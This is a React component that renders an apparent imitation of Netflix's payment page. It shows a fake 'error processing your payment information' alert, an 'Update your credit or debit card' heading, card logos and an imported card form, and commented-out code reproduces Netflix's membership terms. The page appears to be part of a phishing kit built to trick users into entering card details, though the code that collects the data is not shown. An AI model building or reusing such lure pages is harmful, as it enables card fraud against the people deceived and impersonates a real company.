import "./App.css";
import TextField, { TextFieldProps } from "@mui/material/TextField";
import { OutlinedInputProps } from "@mui/material/OutlinedInput";
import { alpha, styled } from "@mui/material/styles";
import InputBase from "@mui/material/InputBase";
import LoadingButton from "@mui/lab/LoadingButton";
import Autocomplete from "react-google-autocomplete";

import { makeStyles } from "@mui/styles";
import { Alert, CircularProgress } from "@mui/material";
import { useState } from "react";
import Places from "./Places";
import Validate from "./Validate-from";
import Billing from "./Billing";

const useStyles = makeStyles((theme) => ({
  root: {
    "& .MuiFilledInput-root": {
      background: "#fff",
      borderRadius: "3px",
    },
  },

  cssLabel: {
    color: "#ffffff",
  },

  textField: {
    borderRadius: "3px",
  },

  circularProgress: {
    marginLeft: "50px",
    position: "absolute",

    width: "100%",
    "  text-align": "center",
  },
}));

const CssTextField = styled(TextField)({
  "& label.Mui-focused": {
    color: "green",
  },
  "& .MuiInput-underline:after": {
    borderBottomColor: "green",
  },
  "& .MuiOutlinedInput-root": {
    "& fieldset": {
      borderColor: "red",
    },
    "&:hover fieldset": {
      borderColor: "yellow",
    },
    "&.Mui-focused fieldset": {
      borderColor: "green",
    },
  },
});

const BootstrapInput = styled(InputBase)(({ theme }) => ({
  "label + &": {
    marginTop: theme.spacing(3),
  },
  "& .MuiInputBase-input": {
    borderRadius: 4,
    position: "relative",
    backgroundColor: theme.palette.mode === "light" ? "#fcfcfb" : "#2b2b2b",
    border: "1px solid #ced4da",
    fontSize: 16,
    width: "auto",
    padding: "10px 12px",
    transition: theme.transitions.create([
      "border-color",
      "background-color",
      "box-shadow",
    ]),
    // Use the system font instead of the default Roboto font.
    fontFamily: [
      "-apple-system",
      "BlinkMacSystemFont",
      '"Segoe UI"',
      "Roboto",
      '"Helvetica Neue"',
      "Arial",
      "sans-serif",
      '"Apple Color Emoji"',
      '"Segoe UI Emoji"',
      '"Segoe UI Symbol"',
    ].join(","),
    "&:focus": {
      boxShadow: `${alpha(theme.palette.primary.main, 0.25)} 0 0 0 0.2rem`,
      borderColor: theme.palette.primary.main,
    },
  },
}));

const RedditTextField = styled((props) => (
  <TextField InputProps={{ disableUnderline: true }} {...props} />
))(({ theme }) => ({
  "& .MuiFilledInput-root": {
    border: "1px solid #808080",
    overflow: "hidden",
    borderRadius: 4,
    height: "50px",
    backgroundColor: theme.palette.mode === "light" ? "#fff" : "#2b2b2b",
    transition: theme.transitions.create([
      "border-color",
      "background-color",
      "box-shadow",
    ]),
    "&:hover": {
      backgroundColor: "transparent",
    },
    "&.Mui-focused": {
      backgroundColor: "transparent",
      boxShadow: `${alpha(theme.palette.primary.main, 0.25)} 0 0 0 2px`,
      borderColor: theme.palette.primary.main,
    },
  },
}));

const ValidationTextField = styled(TextField)({
  "& input:valid + fieldset": {
    borderColor: "green",
    borderWidth: 2,
  },
  "& input:invalid + fieldset": {
    borderColor: "red",
    borderWidth: 2,
  },
  "& input:valid:focus + fieldset": {
    borderLeftWidth: 6,
    padding: "4px !important", // override inline-style
  },
});

function CC() {
  const [loading, setLoading] = useState(false);

  const handleClick = (e) => {
    e.preventDefault();
    setLoading(true);
    alert("click");
    console.log(e);
  };

  const handleData = (e) => {
    e.preventDefault();
  };

  const classes = useStyles();

  return (
    <div class=" grid place-items-center  place-content-center mt-8	 p-4 w-auto">
      <div class="px-5 w-full ">
        <div className="w-auto">
          <div className="mb-5">
            <Alert variant="filled" severity="warning">
              There was an error processing your payment information. Please
              check that all fields are filled out correctly and try again.
            </Alert>
          </div>
          <span className="text-black-900 text-[30px]  font-bold break-word ">
            Update your credit or debit card
          </span>
          <div className="flex row mt-2 mb-3">
            <img
              src="/VISA.png"
              className="ml-1  h-[30px]"
              alt="Flowbite Logo"
            />
            <img
              src="/MASTERCARD.png"
              className="ml-1  h-[30px]"
              alt="Flowbite Logo"
            />
            <img
              src="/AMEX.png"
              className="ml-1  h-[30px]"
              alt="Flowbite Logo"
            />
            <img
              src="/DISCOVER.png"
              className="ml-1  h-[30px]"
              alt="Flowbite Logo"
            />
          </div>
        </div>

        <div className="mb-2  ">
          <Validate />
        </div>

        {/* <div class=" place-items-center w-full">

      <p className='text-stone-500 text-[13px] leading-none mb-1 mt-5	'>
        By clicking the “Start Membership” button below, you agree to our <a href='' className='text-blue-600 text-[14px]'>Terms of Use, Privacy Statement,</a> that you are over 18, and that Netflix will automatically continue your membership and charge the membership fee (currently $19.99/month) to your payment method until you cancel. You may cancel at any time to avoid future charges. To cancel, go to Account and click “Cancel Membership.”     </p>

      

        <button class={
          loading ? "w-full mt-5 bg-red-100 text-white font-bold py-2 px-4 mt-10 h-[50px] rounded focus:outline-none focus:shadow-outline"
          : "w-full mt-5 bg-red-700 text-white font-bold py-2 px-4 mt-10 h-[50px] rounded focus:outline-none focus:shadow-outline"
        } type="button" onClick={handleClick}>
              {loading ? <CircularProgress className={classes.circularProgress} size={30}/> : <div></div>} 
          Update Payment
        </button>

       

        {/* <a href='' className='te xt-blue-600 text-[14px]'>Learn more</a>         */}
      </div>
    </div>
  );
}

export default CC;
